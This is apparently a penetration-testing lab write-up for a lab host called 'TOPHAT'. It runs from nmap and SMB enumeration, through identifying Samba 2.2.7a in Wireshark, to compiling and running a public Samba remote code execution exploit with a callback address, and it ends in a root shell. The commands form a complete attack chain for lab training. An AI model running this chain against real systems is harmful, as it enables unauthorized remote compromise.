Report

Report

1. SYN Stealth scan for all TCP ports. We find 11 open ports
`sudo nmap -p- 10.11.1.115`
![5a2ae55a21e28edb0f643ce345fb7fdb.png](9f3b5e7b337249e998ed2eed2b31f5f3.png)


2. Run service detection on the open ports.
`sudo nmap -p21,22,25,80,111,139,143,199,443,3306,32768 -sV 10.11.1.115`
![205a18f768e6da4bc5a33d8d4bd81ec6.png](bf0aa86d421844f9b6c6bac283ae083e.png)


3. Check for SMB vulnerabilities on port 139. We see it is vulnerable to the "SMBV2 Negotiation Vulnerability"
`sudo nmap --script smb-vuln* -p 139 10.11.1.115`
![1d8e1c6d4914c2a1b54589687bf9c513.png](01c2a565bac84ffe8f10e94556c48aac.png)
DID WE NEED THIS? I DON'T THINK WE USED THE EXPLOIT


4. Enumerate hostname, which turns out to be 'TOPHAT'
`nmblookup -A 10.11.1.115`
![b179f712067c13db3a8409a0ded06425.png](cd1b9c71770b49329d5a06e5de701ee8.png)


5. List Samba shares on port 139. We find IPC$ and ADMIN$
`smbmap -H 10.11.1.115 -P 139`
![4a8af95f694fe0468bfe1c691fec5eb2.png](ee7f052ea69f471b8b86753fad362291.png)


6. Using a text editor such as vi, update /etc/samba/smb.conf to avoid the NT_STATUS_CONNECTION_DISCONNECTED error. We do this by adding the following lines to the global settings in smb.conf. It changes the minimum protocol and requires extended security.
`client min protocol = NT1`
`client use spnego = no`
`client ntlmv2 auth = no`


7. Verify the changes using the cat command
`cat /etc/samba/smb.conf`
![e8981b9923318691e22d1c55dfa3657d.png](7504c63e6eb94c20a01a2ed033fa597b.png)


8. Restart Samba 
`sudo systemctl restart smbd`
![c8455639bd455761180b438865f39eae.png](a3608a76034c4447a8acd2bf9e859fa5.png)


9. Now use smbclient to list shares
`echo exit | smbclient -L \\\\10.11.1.115`
![2926f75f3ca3627347951838e6977a56.png](1c198b23e54c440db220e1a444bf7527.png)


10. Perform an overall scan
Notice that the Share Enumeration section doesn't show the Samba version for Tophat
`enum4linux -a 10.11.1.115`
![c373fc8e3e992a44e427079210699653.png](c683b43812b14e4e9af079b7ff9e313d.png)
![5d522dd642bb0ecac1741d62d04b28b9.png](c36a3a1403ad46e3860932fcfe6c7fcd.png)


11. We want to determine TOPHAT's Samba version. Start Wireshark with filters -> tun0 -> host 10.11.1.115. 
![126266131d686824fb072ca2c2ddf608.png](02697a883eb14e59afa2373c85d1fea0.png)
![f21549bebb5609527f717063749b557c.png](78430715cbdd4ac98f7607869aff39e2.png)


12. Use the smbclient to list shares
`echo exit | smbclient -L 10.11.1.115`
![4b07ebce70b69c5d756f9c060bb89be5.png](c474647ace464870b49334653c2fa726.png)


13. View the Wireshark output
![ef642ed39b2cfc13b01b1a9e2771670e.png](0756663ba4574d77bbb58e4d32cc857b.png)


14. Right click the first SYN ACK packet (the 4th packet) -> Follow -> TCP Stream. Notice that the blue font is from the TOPHAT server. It displays the Samba version of TOPHAT: Unix.Samba 2.2.7a
![c01eda0841e4515629f6f166c73b03ee.png](f760abd2fb394f4d9d12b7897ccfd6fd.png)


15. Searchsploit Samba 2.2.7
`searchsploit samba 2.2.7 remote`
![c35505f6b4c6b0248d306d04f974d00e.png](90965326d2d84467be8453fb4def5b51.png)


16. Download  Samba < 2.2.8 (Linux/BSD) - Remote Code Execution, multiple/remote/10.c
`searchsploit -m 10`
![e3acbe381670d25eb000a574a0a8e48b.png](e80d9f732c204cd99f06b08dfc8bb783.png)


17. Compile 10.c and name the executable 'exploit'
`gcc 10.c -o exploit`
![7f559fa0f3a629fe4317dea9ebd32672.png](cbe71c482e804e028695c727a4463f8f.png)


18. View the exploit usage
`./exploit`
![593fb0d6240c901c0e88d177778993fe.png](f35ca0dd8aa14dd199776c246569a2a0.png)


19. Exploit! We are root.
`./exploit -b 0 -c 192.168.119.214 -p 139 -v 10.11.1.115`
`script /dev/null`
`whoami`
`/sbin/ifconfig`
`cat /root/proof.txt`
![c5353f994714db5d65b91fa6150672b4.png](17203cd263a84ca1b6d7916a056462a8.png)



